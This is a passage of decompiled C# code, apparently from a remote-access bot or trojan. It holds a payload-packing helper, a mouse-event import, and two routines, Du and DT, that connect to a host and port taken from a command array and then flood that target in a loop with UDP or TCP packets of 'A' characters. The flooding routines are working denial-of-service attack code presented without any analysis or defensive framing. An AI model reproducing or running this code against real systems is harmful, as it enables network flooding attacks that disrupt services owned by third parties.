				num = ((NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null).ToString()!.Length <= 3) ? Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)) : Conversions.ToInteger(Strings.Mid(Conversions.ToString(NewLateBinding.LateIndexGet((object)array3, new object[1] { 1 }, (string[])null)), 1, 3)));
			}
		}
		return text + "." + Conversions.ToString(num) + text2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	public static byte[] SB(ref string s, ref byte[] B)
	{
		MemoryStream memoryStream = new MemoryStream();
		byte[] bytes = Encoding.Default.GetBytes(s);
		memoryStream.Write(bytes, 0, bytes.Length);
		byte[] byt = B;
		bool Compress = true;
		byte[] array = API.ZIP(byt, ref Compress);
		memoryStream.Write(array, 0, array.Length);
		return memoryStream.ToArray();
	}

	public static string _P(ref int y)
	{
		pk = "";
		int num = y;
		for (int i = 0; i <= num; i++)
		{
			pk += "A";
		}
		return pk;
	}

	public static void Du(Array z)
	{
		byte[] array = new byte[0];
		Encoding aSCII = Encoding.ASCII;
		int y = 1000;
		array = aSCII.GetBytes(_P(ref y));
		try
		{
			TcpClient tcpClient = new TcpClient();
			Socket client = tcpClient.Client;
			object[] array2 = new object[2];
			object[] array3 = array2;
			object[] array4 = new object[1];
			object[] array5 = array4;
			y = 0;
			array5[0] = 0;
			array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array4, (string[])null));
			object[] array6 = array2;
			object[] array7 = new object[1];
			object[] array8 = array7;
			int num = 1;
			array8[0] = 1;
			array6[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array7, (string[])null));
			object[] array9 = array2;
			object[] array10 = array9;
			bool[] array11 = new bool[2] { true, true };
			NewLateBinding.LateCall((object)client, (Type)null, "Connect", array10, (string[])null, (Type[])null, array11, true);
			if (array11[0])
			{
				NewLateBinding.LateIndexSetComplex((object)z, new object[2]
				{
					y,
					RuntimeHelpers.GetObjectValue(array9[0])
				}, (string[])null, true, false);
			}
			if (array11[1])
			{
				NewLateBinding.LateIndexSetComplex((object)z, new object[2]
				{
					num,
					RuntimeHelpers.GetObjectValue(array9[1])
				}, (string[])null, true, false);
			}
			tcpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		int num2 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)z, new object[1] { 2 }, (string[])null));
		for (int i = 0; i <= num2; i++)
		{
			UdpClient udpClient = new UdpClient();
			try
			{
				object[] array9 = new object[2];
				object[] array12 = array9;
				object[] array13 = new object[1];
				object[] array14 = array13;
				int num = 0;
				array14[0] = 0;
				array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array13, (string[])null));
				object[] array15 = array9;
				object[] array16 = new object[1];
				object[] array17 = array16;
				y = 1;
				array17[0] = 1;
				array15[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)z, array16, (string[])null));
				object[] array2 = array9;
				object[] array18 = array2;
				bool[] array11 = new bool[2] { true, true };
				NewLateBinding.LateCall((object)udpClient, (Type)null, "Connect", array18, (string[])null, (Type[])null, array11, true);
				if (array11[0])
				{
					NewLateBinding.LateIndexSetComplex((object)z, new object[2]
					{
						num,
						RuntimeHelpers.GetObjectValue(array2[0])
					}, (string[])null, true, false);
				}
				if (array11[1])
				{
					NewLateBinding.LateIndexSetComplex((object)z, new object[2]
					{
						y,
						RuntimeHelpers.GetObjectValue(array2[1])
					}, (string[])null, true, false);
				}
				udpClient.Client.SendTimeout = 500;
				udpClient.Client.Send(array, array.Length, SocketFlags.None);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void DT(Array Z)
	{
		byte[] array = new byte[0];
		Encoding aSCII = Encoding.ASCII;
		int y = 1000;
		array = aSCII.GetBytes(_P(ref y));
		try
		{
			TcpClient tcpClient = new TcpClient();
			Socket client = tcpClient.Client;
			object[] array2 = new object[2];
			object[] array3 = array2;
			object[] array4 = new object[1];
			object[] array5 = array4;
			y = 0;
			array5[0] = 0;
			array3[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array4, (string[])null));
			object[] array6 = array2;
			object[] array7 = new object[1];
			object[] array8 = array7;
			int num = 1;
			array8[0] = 1;
			array6[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array7, (string[])null));
			object[] array9 = array2;
			object[] array10 = array9;
			bool[] array11 = new bool[2] { true, true };
			NewLateBinding.LateCall((object)client, (Type)null, "Connect", array10, (string[])null, (Type[])null, array11, true);
			if (array11[0])
			{
				NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
				{
					y,
					RuntimeHelpers.GetObjectValue(array9[0])
				}, (string[])null, true, false);
			}
			if (array11[1])
			{
				NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
				{
					num,
					RuntimeHelpers.GetObjectValue(array9[1])
				}, (string[])null, true, false);
			}
			tcpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		int num2 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)Z, new object[1] { 2 }, (string[])null));
		for (int i = 0; i <= num2; i++)
		{
			TcpClient tcpClient2 = new TcpClient();
			try
			{
				object[] array9 = new object[2];
				object[] array12 = array9;
				object[] array13 = new object[1];
				object[] array14 = array13;
				int num = 0;
				array14[0] = 0;
				array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array13, (string[])null));
				object[] array15 = array9;
				object[] array16 = new object[1];
				object[] array17 = array16;
				y = 1;
				array17[0] = 1;
				array15[1] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)Z, array16, (string[])null));
				object[] array2 = array9;
				object[] array18 = array2;
				bool[] array11 = new bool[2] { true, true };
				NewLateBinding.LateCall((object)tcpClient2, (Type)null, "Connect", array18, (string[])null, (Type[])null, array11, true);
				if (array11[0])
				{
					NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
					{
						num,
						RuntimeHelpers.GetObjectValue(array2[0])
					}, (string[])null, true, false);
				}
				if (array11[1])
				{
					NewLateBinding.LateIndexSetComplex((object)Z, new object[2]
					{
						y,
						RuntimeHelpers.GetObjectValue(array2[1])
					}, (string[])null, true, false);
				}
				tcpClient2.Client.SendTimeout = 500;
				tcpClient2.Client.Send(array, array.Length, SocketFlags.None);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
